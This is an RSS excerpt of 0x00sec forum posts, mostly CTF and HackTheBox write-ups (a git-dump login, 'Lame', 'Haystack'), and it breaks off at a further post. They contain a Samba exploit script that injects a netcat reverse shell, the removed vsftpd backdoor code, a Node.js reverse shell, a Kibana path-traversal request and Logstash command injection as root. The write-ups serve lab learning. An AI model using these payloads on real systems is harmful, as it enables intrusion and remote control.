<p>However, in our case, this will not work, due to the Access Forbidden error code on the <code>.git/</code> index. If you want to learn more about public git folders and how to download them checkout this <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/" rel="nofollow noopener">article</a>.</p>
<p>Another way is to use tools like <a href="https://github.com/internetwache/GitTools" rel="nofollow noopener">GitTools</a>.<br>
With <code>bash ./gitdumper.sh https://exercise-1.0x00sec.dev/.git/ output</code><br>
I downloaded the git repository.</p>
<p><span alt="git-dumper" data-base62-sha1="ry5oIZLDbBDHctyODqE79WGSb8G" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now we can use the terminal git or any gui git client to check out the commits and the source.</p>
<p>With <code>git status</code> we see that there are two staged files to be deleted <code>start.sh</code> and <code>index.php</code>.</p>
<p>The first one is a start script for docker and the latter one the PHP source code of the page.</p>
<h2>The login</h2>
<p>Let’s now take a deeper look into the login action in the PHP source code (index.php).</p>
<p>The login action looks like this:</p>
<pre><code class="lang-php">    if (isset($_POST["username"]) &amp;&amp; isset($_POST["password"])) {
        if ($_POST["username"] == "admin" &amp;&amp; hash('sha256', $_POST["password"]) == "e83176eaefcc1ae8c4a23dbc73ebcf122f26cfb9ba5c7cf4763e96c1c38a6c6c") {
            echo '&lt;h4&gt; '.xor_this(base64_decode("Cl9SEwgSQRVFUA1dAl1dVFkaQF0CWAQUTQ=="), $_POST["password"]).' &lt;/h4&gt;';
        } else {
            echo '&lt;h4 class="error"&gt; Incorrect Password :) &lt;/h4&gt;';
        }
    }
</code></pre>
<p>So if our username is <code>admin</code> and our password matched the sha256 hash, a base64 string will be passed into <code>xor_this(string, key)</code>.</p>
<p>As <code>sha246</code> is not secure we can easily crack it. Or even better, try to look it up. Maybe someone already cracked it.</p>
<p>So I pasted the hash into <a href="https://crackstation.net/" rel="nofollow noopener">CrackStation.net</a> and the hash was already cracked and I got the password.</p>
<p>After the login, the flag was printed out.</p>
<h2>Conclusion</h2>
<p>This CTF exercise was quite fun and also quite a real-world scenario. Because public git directories are real and sadly more common then you might think.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-1/19412">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-1/19412</link>
          <pubDate>Sat, 22 Feb 2020 11:05:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19412</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-1/19412.rss">Writeup: 0x00sec CTF - Exercise #1</source>
        </item>
        <item>
          <title>Bi-Monthly 0x00sec CTF Exercises - #2 Release!</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>If you’re an initiated 0x00er, you’ll know that we’ve recently started doing Bi-monthly 0x00sec CTF exercises, that means once every 2 weeks, we’re releasing a new easy exercise.</p>
<aside class="quote quote-modified" data-post="1" data-topic="19044">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar">
    <a href="https://0x00sec.org/t/introducing-bi-monthly-0x00sec-ctf-exercises/19044">Introducing: Bi-Monthly 0x00sec CTF Exercises!</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/site-feedback/announcements/17"><span class="badge-category-parent-bg" style="background-color: #808281;"></span><span class="badge-category-bg" style="background-color: #AB9364;"></span><span style="" data-drop-close="true" class="badge-category clear-badge" title="This category is where you will come for announcements about the 0x00sec project.">0x00sec Announcements</span></a>
  </div>
  <blockquote>
    Hey 0x00ers! 
We have been working on something really cool, and are bringing bi-monthly 0x00sec CTF exercises. 
The purpose of this is to make very short, 10-30 minute exercises designed to teach you new techniques and get your hacker juices flowing <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title="smiley" alt="smiley" class="emoji"> 
The challenges are supposed to be basic, and not extensive at all. Sharing on how to solve these during the open-challenge window is permitted and good hints are encouraged. 
At the end of the day this initiative isn’t designed to make you…
  </blockquote>
</aside>

<p>The idea is that the challenges are short, easy, and fun enough to play before your workday or a quick evening bite-sized exercise.</p>
<p>For now, it’s just Web, but forensics and crypto is coming soon!</p>
<p>Today we’re shock-dropping the second challenge, this a fun one, and another exercise found in a real-life webapp pentest I performed a couple of years ago.</p>
<p>You’re going to enjoy this one <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>If you aren’t already registered:</p>
<p><a href="https://ctf.0x00sec.org/" class="onebox" target="_blank">https://ctf.0x00sec.org/</a></p>
<p>Good luck!</p>
<p><a href="https://ctf.0x00sec.org/challenges#Exercise%20#2" class="onebox" target="_blank">https://ctf.0x00sec.org/challenges#Exercise%20#2</a></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/bi-monthly-0x00sec-ctf-exercises-2-release/19396">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bi-monthly-0x00sec-ctf-exercises-2-release/19396</link>
          <pubDate>Fri, 21 Feb 2020 20:20:35 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19396</guid>
          <source url="https://0x00sec.org/t/bi-monthly-0x00sec-ctf-exercises-2-release/19396.rss">Bi-Monthly 0x00sec CTF Exercises - #2 Release!</source>
        </item>
        <item>
          <title>Through the looking glass: LAME</title>
          <dc:creator><![CDATA[Jarvis]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>Hey everybody, welcome to my first post on 0x00sec and hopefully the first of many in this <em>Through The Looking Glass</em> series.</p>
<h1>The Purpose</h1>
<p>A lot of Writeups are very straightforward, you nmap the server, you find the vulnerable service. You searchsploit ‘vulnerable service and version’, you load the appropriate msf-module and flags are raining across the screen.</p>
<p>I wanted to have a better look at how these exploits work, and how we can find and create exploits just by looking at patches and the like.</p>
<p>For advanced CTF’ers and Pwners this won’t be anything new, it might not be new if you’ve read vulnerability analysis, but I hope it can be a good resource for new people who are interested in how this stuff all comes together. ( And it’s a good way to try and force myself to contribute <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> )</p>
<p>With that out of the way,…</p>
<h1>Enter LAME (vsftpd 2.3.4 backdoor and CVE-2007-2447)</h1>
<p>I wanted to start bigger, and not use vulnerability scanners.<br>
Because of this, I started out with my nmap portscan, and just began my journey on the lowest port.</p>
<pre><code>21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</code></pre>
<h2>vsftpd 2.3.4 and vsf_sysutil_extra backdoor</h2>
<p>Because the year is 2020 and news spreads fast, when I started my dumb approach of vsftpd, the term backdoor immediately got thrown in my face upon the first Google search.</p>
<p>It turns out that, at some point in time, someone had managed to build a backdoor into vsftpd.</p>
<p>Armed with this knowledge, I found a blog post by the maintainer of vsftpd that contained a link to pastebin, where a diff was shown from after the backdoor was removed (longer code ahead):</p>

Full Patch <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>If you’ve ever programmed sockets in C, You immediately recognize the part where the TCP Server is being set up, if you don’t, <a href="https://www.binarytides.com/socket-programming-c-linux-tutorial/" rel="nofollow noopener">Here</a>’s a good read <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<pre><code>-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&amp;sa,
-  sizeof(struct sockaddr))) &lt; 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  {
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0);
</code></pre>
<p>So a TCP Server is being set up on port 6200 in this function, and then it just accepts any connection and pipe’s everything from and to /bin/sh.</p>
<p>The other part shows us how we can trigger this function:</p>
<pre><code>-    else if((p_str-&gt;p_buf[i]==0x3a)
-    &amp;&amp; (p_str-&gt;p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
}
</code></pre>
<p>We have this mysterious buffer called p_buf that’s a member of p_str, and if the i’d and i+1’d character respectively are 0x3a and 0x29, it runs the vsf_sysutil_extra() function, effectively setting up the backdoor on port 6200.</p>
<p>The snake quickly shows us what these bytes are:</p>
<pre><code>&gt;&gt;&gt; s = b'\x3a\x29'
&gt;&gt;&gt; s.encode('utf-8')
':)'
</code></pre>
<p>Because I couldn’t find the original source code for vsftpd 2.3.4 that had this vulnerability, I later found out that one of the things that enters p_str’s p_buf, is the username.</p>
<p>So all we have to do to trigger the backdoor is enter a smileyface for the username, and the backdoor should spawn on 6200.</p>
<pre><code>jarvis@kali:~/Documents/research$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:jarvis): :)
331 Please specify the password.
Password: (eehm wtf?)
530 Login incorrect.
Login failed.
ftp&gt; exit
221 Goodbye.
</code></pre>
<p>So after 2 hours of trying to find the details of this vulnerability, finding an anticlimactic tcp bind backdoor, it turns out it’s anti-anticlimactically patched ! Seems like this box didn’t steal its name <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h2>Samba 3.0.20</h2>
<p>Because I didn’t have smbv1 enabled, my machine couldn’t properly communicate with the server’s smbd and I had no idea where to start with this approach.<br>
I could just load every samba exploit into metasploit, and I’d probably find one that works, but that wont be interesting and I wont learn from that.</p>
<p>I later ran into <a href="https://github.com/blark/checksmbv1/blob/master/checksmbv1.py" rel="nofollow noopener">this</a> script, that uses the amazing impacket library to test for smbv1.</p>
<p>Lo and behold:</p>
<pre><code>jarvis@ubuntu:~/Tools$ python3 check_smb1.py 10.10.10.3
Attempting SMBv1 connection to 10.10.10.3...
Success!
</code></pre>
<p>Now that we know this, we ran smbclient from our smbv1 enabled machine and quickly found a correct version number: 3.0.20.<br>
I started looking around CVEDetails and found <a href="https://www.cvedetails.com/cve/CVE-2007-2447/" rel="nofollow noopener">this nice little CVE</a>.</p>
<blockquote>
<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the “username map script” smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p>
</blockquote>
<p>It’s a very long shot, because it requires a non-default option to be turned on. But it’s a solid exploit and certainly worth a try from this point of view.</p>
<p>We find a patch for 3 vulnerabilities for version 3.0.24:</p>
<p><span alt="image" data-base62-sha1="qGZXEGkwkuxsTVHyQJykGljnWNd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Which also has our CVE-2007-2447.<br>
A link to the full patch is <a href="https://www.samba.org/samba/ftp/patches/security/samba-3.0.24-CVE-2007-2447_v2.patch" rel="nofollow noopener">here</a> if you want to read it, I’ll only include relevant parts below.</p>
<p>I downloaded the 3.0.24 source code, applied the patch and started a comparison in Meld (I don’t like reading raw patch notes, sue me).</p>
<p>A first indicator of a possible fix was here:</p>
<p><span alt="image" data-base62-sha1="4Cv3baawSQqnLpeaar4pQNsGIor" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>They added an option to the smbrun function to toggle sanitizing.<br>
Does that mean stuff didn’t get sanitized before?</p>
<p>And that’s when we see it in all its glory:</p>
<p><span alt="image" data-base62-sha1="t1AWFXdSXY6GDS1TekiKmd9cPMS" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>What this means, is that if we have ANY saying over what’s in ‘cmd’, we might just have found our RCE.</p>
<p>I quickly grep the source files for uses of this smb function and notice something interesting:</p>

Full Grep <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>There’s this line:</p>
<pre><code>smbd/map_username.c:            ret = smbrun(command, &amp;fd);
</code></pre>
<p>CVEDetails clearly made note of the “username map script” being enabled in the config.<br>
When reading the comments, we notice that’s pretty much gonna be all there’s to it:</p>
<blockquote>
<p>…<br>
This is the main function that should be called <em>once</em> on<br>
any incoming or new username - in order to canonicalize the name.<br>
…</p>
</blockquote>
<p>So, if the script is enabled, on every incoming connection this command will be called?</p>
<p>And then we see how we might get our input into the cmd variable:</p>
<pre><code>pstr_sprintf( command, "%s \"%s\"", cmd, user );
ret = smbrun(command, &amp;fd);
</code></pre>
<p>This basically creates a string ‘some_command “user”’ and passes it to smbrun.<br>
smbrun in turn, just execl’s this without sanitizing.</p>
<h2>The exploit</h2>
<p>We know this function takes a hardcoded or variable ‘map user’ command, and then appends our username to it, this makes its way to execl and gets piped into /bin/sh -c.</p>
<p>When adding backticks, (which are specifically filtered after the patch), you will execute the command inside those backticks before passing it to the outer command.</p>
<p>So what would happen if our username was Jimmy<code>ls</code> ?</p>
<p>Our command string would become map_user_command “Jimmy<code>ls</code>”</p>
<p>So what if our map_user_command hypothetically is echo ?</p>
<pre><code>jarvis@kali:~/Documents/research$ echo "Jimmy`ls`"
Jimmysamba-3.0.24
samba-3.0.24-patched
samba-3.0.24.tar.gz
samba.patch
</code></pre>
<p>I quickly grabbed the SMBv1 checker, and modified it to send a netcat reverse shell payload.</p>
<pre><code>from impacket.smbconnection import SMBConnection, smb
import click
@click.command()
@click.argument('ip')
@click.argument('rev_shell_ip')
@click.argument('rev_shell_port')
def check_smbv1(ip, rev_shell_ip, rev_shell_port):
    click.echo(f'Attempting SMBv1 connection to {ip}', nl=False)
    try:
        s = SMBConnection('*SMBSERVER', ip, preferredDialect=smb.SMB_DIALECT)
        if isinstance(s, SMBConnection):
            click.secho('Success!', fg='green')
            click.secho('Attempting to send PoC exploit payload...', fg='yellow')
            s.login(b'Jimmy`nc 10.10.14.30 4444 -e /bin/bash`', 'fakepass')
    except Exception as e:
        click.secho('Failed...', fg='red', nl=False)
        click.echo(e)
        return
if __name__ == '__main__':
    check_smbv1()
</code></pre>
<p>And the magic came all together:</p>
<p><span alt="image" data-base62-sha1="t1bjTNokvwUQjbClM7i2HhYpAno" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Because SMBd was running as root, this was pretty much all there is to this machine.</p>
<p>I hoped you enjoyed reading, if you have questions or tips let me know, dont forget to &lt;3 the post if you liked it, so I know I can do more of this basic stuff on here!</p>
<p>Ah, I allmost forgot the flags!</p>

Summary <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>Thanks all,</p>
<p>Jarvis</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149</link>
          <pubDate>Tue, 11 Feb 2020 18:48:33 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19149</guid>
          <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
        </item>
        <item>
          <title>Hack The Box - Haystack</title>
          <dc:creator><![CDATA[hostile.node]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" alt="" data-base62-sha1="4R4ppBzjzDNt2Kqyggs4I3fqZOl" width="589" height="334"></p>
<p>We start by running nmap, with the following options:</p>
<blockquote>
<p>root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115</p>
</blockquote>
<p>I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:</p>
<pre><code>PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods:
|   Supported Methods: HEAD GET DELETE OPTIONS
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
</code></pre>
<p>On port 80, it’s just a page with an image of a needle in a haystack.</p>
<p>But since this is HTB, it’s worth having a quick look for any steganography. <code>strings</code> doesn’t reveal anything, but <code>xxd</code> does, at the very end of the file:</p>
<pre><code>0002ca80: 8a00 28a2 8a00 28a2 8a00 28a2 8a00 28a2  ..(...(...(...(.
0002ca90: 8a00 28a2 8a00 ffd9 0a62 4745 6759 5764  ..(......bGEgYWd
0002caa0: 3161 6d45 675a 5734 675a 5777 6763 4746  1amEgZW4gZWwgcGF
0002cab0: 7159 5849 675a 584d 6749 6d4e 7359 585a  qYXIgZXMgImNsYXZ
0002cac0: 6c49 673d 3d0a                           lIg==.
</code></pre>
<p>That looks like base64, so let us decode that:</p>
<blockquote>
<p>root@flagship:~# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d<br>
la aguja en el pajar es “clave”</p>
</blockquote>
<p>Spanish for <em>the needle in the page is “key”</em> or perhaps literally, <em>clave</em> .</p>
<p>Since there doesn’t appear to be anything else to do with the image, let’s have a look at port 9200. If we access it, we get the following:</p>
<pre><code>root@flagship:~/htb/jarvis# curl http://10.10.10.115:9200/
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</code></pre>
<p>So we’re dealing with an ElasticSearch instance, version 6.4.2. If you aren’t familiar with it, this is a good starting point: <a href="http://joelabrahamsson.com/elasticsearch-101/" rel="noopener nofollow ugc">ElasticSearch 101</a>. However, the relevant part here is that URLs are expected to be in the format of <code>http://10.10.10.115:9200/&lt;index&gt;/&lt;type&gt;/&lt;id&gt;</code> , so we can try to find which indices are available with gobuster:</p>
<pre><code>root@flagship:~# gobuster dir -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115:9200/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/07 21:21:02 Starting gobuster
===============================================================
/quotes (Status: 200)
/bank (Status: 200)
</code></pre>
<p>Knowing that the indices <code>quotes</code> and <code>bank</code> exist, we then need to find types which have indices. Gobuster won’t cut it for this, as we want to look for <code>http://10.10.10.115:9200/quotes/&lt;type&gt;/1</code> and <code>http://10.10.10.115:9200/bank/&lt;type&gt;/1</code> , so we turn to wfuzz:</p>
<pre><code>root@flagship:~# wfuzz -u http://10.10.10.115:9200/quotes/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/quotes/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000826:  C=200      0 L       63 W          462 Ch        "quote"
</code></pre>
<p>And then we repeat the same for <code>bank</code>:</p>
<pre><code>root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/bank/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000349:  C=200      0 L        3 W          286 Ch        "account"
</code></pre>
<p>Now that we know two types, we just have to identify what valid ids there are. Again, wfuzz can do this by using a range iterator:</p>
<blockquote>
<p>root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/bank/account/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/account/FUZZ</a> -z range,1-2000 --hc 404<br>
root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/quotes/quote/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/FUZZ</a> -z range,1-2000 --hc 404</p>
</blockquote>
<p>This will show us that there are 999 valid ids – which we can then download using our trusty curl for further analysis.</p>
<blockquote>
<p>root@flagship:~# curl “<a href="http://10.10.10.115:9200/bank/accounts/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/accounts/[1-999]</a>” -o “accounts/<span class="hashtag">#1</span>”<br>
root@flagship:~# curl “<a href="http://10.10.10.115:9200/quotes/quote/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/[1-999]</a>” -o “quotes/<span class="hashtag">#1</span>”</p>
</blockquote>
<p>I didn’t find any useful information in the nearly 2000 files when blindly searching for credentials, but using what we’ve got from the image we get the following:</p>
<blockquote>
<p>root@flagship:~# grep -r clave *<br>
quotes/45.html:{"_index":“quotes”,"_type":“quote”,"_id":“45”,"_version":1,“found”:true,"_source":{“quote”:“Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg “}}<br>
quotes/111.html:{”_index”:“quotes”,"_type":“quote”,"_id":“111”,"_version":1,“found”:true,"_source":{“quote”:“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=”}}</p>
</blockquote>
<p>With some more base64-looking strings, we decode them as before:</p>
<pre><code>root@flagship:~# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 
root@flagship:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
</code></pre>
<p>With these credentials, we can login via SSH and grab the user flag.</p>
<blockquote>
<p>root@flagship:~# ssh <a href="mailto:security@10.10.10.115">security@10.10.10.115</a><br>
<a href="mailto:security@10.10.10.115">security@10.10.10.115</a>’s password:<br>
[security@haystack ~]$ ls<br>
user.txt</p>
</blockquote>
<p>Now that we have a foothold, the next step is to run <a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh" rel="noopener nofollow ugc">Linux Smart Enumeration</a> and see if that gives us anything interesting to go on. Thankfully, since we already have SSH access, we can just copy it over with scp rather anything more elaborate.</p>
<p>From a cursory look at the results from LSE, we can see this server is running an ELK stack (<a href="https://www.elastic.co/products/elasticsearch" rel="noopener nofollow ugc">ElasticSearch</a>, <a href="https://www.elastic.co/products/logstash" rel="noopener nofollow ugc">Logstash</a>, <a href="https://www.elastic.co/products/kibana" rel="noopener nofollow ugc">Kibana</a>), with matching user accounts. Additionally, Logstash is running as root and is a likely escalation point.</p>
<p>It also looks like the following ports can be accessed internally: 5601 (Kibana), 9000 and 9300 (both ElasticSearch). 5601 is particularly interesting as it wasn’t available remotely.</p>
<p>Since we know we’re running ElasticSearch 6.4.2, it’s worth checking if there are any issues we can leverage. <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13554/Elasticsearch.html" rel="noopener nofollow ugc">Looking for vulnerabilities</a> the very first one seems relevant: <a href="https://www.cvedetails.com/cve/CVE-2018-17246/" rel="noopener nofollow ugc">CVE-2018-17246</a> (detailed explanation <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener nofollow ugc">here</a>).</p>
<p>It looks like we might get an LFI using this, which would then let us gain access to the kibana user. We can get a viable node reverse shell from <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell" rel="noopener nofollow ugc">here</a>:</p>
<pre><code>(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
</code></pre>
<p>We copy this to haystack (in my case, I copied it to /tmp) and call the vulnerable endpoint:</p>
<pre><code>[security@haystack tmp]$ curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../tmp/hn1.js  
</code></pre>
<p>An on our attacking machine we get a callback:</p>
<pre><code>root@flagship:~/shared.node/htb# nc -lvp 1337
listening on [any] 1337 ...
10.10.10.115: inverse host lookup failed: Unknown host
connect to [10.10.16.40] from (UNKNOWN) [10.10.10.115] 52436
whoami
kibana
</code></pre>
<p>And then we upgrade our shell into something a bit more usable:</p>
<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$
</code></pre>
<p>We know that logstash runs as root, so that is probably our way in. The normal flow for a simple ELK stack is that data from ElasticSearch gets processed by LogStash and then presented by Kibana, and we can find that step in <code>/etc/logstash/conf.d</code>. The folder is only accessible now that we are logged in as the kibana user. However, although the files can be read, they can’t be modified.</p>
<h2>input.conf</h2>
<pre><code>input {
         file {
                 path =&gt; "/opt/kibana/logstash_*"
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null"
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute"
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2>filter.conf</h2>
<pre><code>filter {
        if [type] == "execute" {
                grok {
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2>output.conf</h2>
<pre><code>output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                exec {
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>From reading these files, we can see that it takes input files in the folder /opt/kibana/, with the filename having to start with logstash_. The contents of the file have to be Ejecutar comando : followed by the command we want to execute.</p>
<p>Since we know what we want to get out is the root flag, we can do the following:</p>
<pre><code>bash-4.2$ echo Ejecutar comando : cp /root/root.txt /tmp/root.txt &gt; /tmp/logstash_root
bash-4.2$ echo Ejecutar comando : chmod 777 /tmp/root.txt &gt; logstash_root2
</code></pre>
<p>And within ten seconds our commands will get executed:</p>
<pre><code>bash-4.2$ wc -c /tmp/root.txt&lt;br&gt;
wc -c /tmp/root.txt&lt;br&gt;
33 /tmp/root.txt
</code></pre>
<p>Hopefully this was useful to someone <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hack-the-box-haystack/17303">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hack-the-box-haystack/17303</link>
          <pubDate>Mon, 04 Nov 2019 15:20:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-17303</guid>
          <source url="https://0x00sec.org/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Bastion</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/91e243f52a10caca8a8034474494704d10e55ce4.png" alt="image" data-base62-sha1="kOy0iavcX1uiWr2ACFLzX2rPydu" width="598" height="381"></p>
